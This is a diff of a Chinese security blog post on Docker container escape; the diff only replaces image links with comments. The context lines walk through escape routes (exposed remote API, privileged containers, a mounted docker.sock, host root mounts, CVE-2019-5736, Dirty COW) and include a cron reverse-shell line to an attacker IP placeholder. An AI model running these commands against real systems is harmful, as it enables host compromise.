@@ -7,7 +7,7 @@ tags: ["docker"]
 
 **Docker**
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/001-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/001-0.webp -->
 
 docker是一个用Go语言实现的开源项目，可以方便地创建和使用容器，docker将程序以及程序所有的依赖都打包到docker container，这样程序可以在任何环境都会有一致的表现，这里程序运行的依赖也就是容器就好比集装箱，容器所处的操作系统环境就好比货船或港口，程序的表现只和集装箱有关系(容器)，和集装箱放在哪个货船或者哪个港口(操作系统)没有关系。不会再有“在我的环境上可以运行”，真正实现“build once, run everywhere”。
 
@@ -24,7 +24,7 @@ docker是一个用Go语言实现的开源项目，可以方便地创建和使用
 
 Docker之所以会出现安全性问题，根源在于**容器和宿主机共用内核**，因此受攻击面特别大；另外，如果容器里的应用导致Linux内核崩溃，整个系统也会随之崩溃。这一点与虚拟机是不同的，虚拟机与宿主机的接口非常有限，而且虚拟机崩溃一般不会导致宿主机崩溃。在共用内核的前提下，容器主要通过内核的Cgroup和Namespace这两大特性来达到容器隔离和资源限制的目的。目前Cgroup对系统资源的限制比较完善，但Namespace的隔离还是不够完善，只有PID、mount、network、UTS、IPC和user这几种手段。而对于未隔离的内核资源，容器访问时也会存在影响到宿主机及其他容器的风险。比如，procfs里的很多接口都未隔离，通过procfs可以查询到整个系统的信息，包括系统的CPU、内存等资源信息，所以Docker容器的procfs是以只读方式挂载的，否则修改procfs里的内核参数将会影响甚至破坏宿主机。内核syslog也是没有被隔离的，因此在容器内可以看到容器外其他进程产生的内核syslog。因此，Namespace的隔离非但是不完善的，甚至是不可能完善的。这是共用内核导致的固有缺陷，并且未来Linux内核社区也不会对此做太多的改进。在众多风险中，如果从虚拟机容器权限中逃逸出来，获取了宿主机权限，则为“虚拟机逃逸”，今天在这里做详细介绍。轻功护身，随意逃逸~
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/002-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/002-0.webp -->
 
   
  
@@ -39,7 +39,7 @@ Docker之所以会出现安全性问题，根源在于**容器和宿主机共用
 ls -al /
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/003-0.png)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/003-0.png -->
 
 **方法二：检查 /proc/1/cgroup 是否存在含有docker字符串**
 
@@ -49,7 +49,7 @@ ls -al /
 cat /proc/1/cgroup
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/004-0.webp)  
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/004-0.webp -->  
  
 
   
@@ -86,7 +86,7 @@ docker -H xx.xx.xx.xx:2375 run -it --privileged alpine /bin/sh
 fdisk -l
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/005-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/005-0.webp -->
 
 3、创建测试目录，并将本地磁盘挂载在test目录下
 
@@ -107,11 +107,11 @@ mount /dev/vda1 /test
  * * * * bash -i >& /dev/tcp/【攻击机器ip】/6666 0>&1
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/006-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/006-0.webp -->
 
 反弹shell成功：
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/007-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/007-0.webp -->
 
 Exp 脚本:
 
@@ -201,7 +201,7 @@ docker pull ubuntu:16.04
 docker run -itd --privileged ubuntu:16.04 /bin/bash
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/008-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/008-0.webp -->
 
 2、漏洞验证
 
@@ -211,7 +211,7 @@ docker run -itd --privileged ubuntu:16.04 /bin/bash
 cat /proc/self/status |grep Cap
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/009-0.png)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/009-0.png -->
 
 3、漏洞利用
 
@@ -233,7 +233,7 @@ mkdir /hacker
 mount /dev/sda5 /hacker
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/010-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/010-0.webp -->
 
 进入到hacker目录,通过touch创建一个sh文件，再将bash反弹命令写入到创建的sh文件里面，在编写计划任务到/hacker/etc/crontab文件中。
 
@@ -251,13 +251,13 @@ echo "* * * * * root bash /hacker.sh" >> /hacker/etc/crontab
 
 返回到kali中进行查看，已成功接收到shell。
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/011-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/011-0.webp -->
 
 ## 3、挂载docker.sock
 
 **什么是docker.sock**
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/012-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/012-0.webp -->
 
 docker.sock 是docker client 和docker daemon 在localhost进行通信的socket文件
 
@@ -271,7 +271,7 @@ Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine
 docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/013-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/013-0.webp -->
 
 随后在docker容器中安装docker：
 
@@ -357,7 +357,7 @@ docker run -it -v /:/uzju ubuntu:18.04 /bin/bash
 chroot uzju
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/014-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/014-0.webp -->
 
 docker容器反弹shell通过修改crontab即可实现：
 
@@ -371,7 +371,7 @@ crontab -e  
 
  
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/015-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/015-0.webp -->
 
 ## 4、挂载宿主机根目录
 
@@ -381,7 +381,7 @@ crontab -e  
 docker run -it -v /:/uzju/ ubuntu:18.04 chroot /uzju/
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/016-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/016-0.webp -->
 
 **反弹shell**可以通过crontab反弹shell
 
@@ -474,11 +474,11 @@ https://github.com/Frichetten/CVE-2019-5736-PoC
 
 将此内容进行更改，设置nc监听地址。修改payload内容：
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/017-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/017-0.webp -->
 
 此时编译payload需要go环境，直接安装即可，生成可执行脚本main
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/018-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/018-0.webp -->
 
 编译完成后，我们运行一个漏洞环境(以CVE-2020-1957漏洞为例)
 
@@ -508,11 +508,11 @@ docker cp /home/szg/CVE-2019-5736-PoC/main 3d5341ae0bf5:/home
 docker exec -it 3d5341ae0bf5 /bin/sh (第一次需使用/bin/sh启动)
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/019-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/019-0.webp -->
 
 ubuntu启动一个新终端，执行如下命令再次进入容器，触发payload，成功反弹shell，此时权限为服务器权限，docker逃逸成功
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/020-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/020-0.webp -->
 
 ## 7、(CVE-2016-5195)脏牛漏洞实现Docker逃逸
 
@@ -595,7 +595,7 @@ apt-cache madison docker-ce
 apt-get install docker-ce=5:19.03.6~3-0~ubuntu-xenial docker-ce-cli=5:19.03.6~3-0~ubuntu-xenial containerd.io=1.2.4-1
 ```
 
-![图片](/assets/images/posts/网安/内网横向/一文讲清Docker逃逸/021-0.webp)
+<!-- img: /assets/images/posts/网安/内网横向/一文讲清Docker逃逸/021-0.webp -->
 
 拉取ubuntu:18.04镜像，使用--net=host启动，并进入到该容器内部。  
  
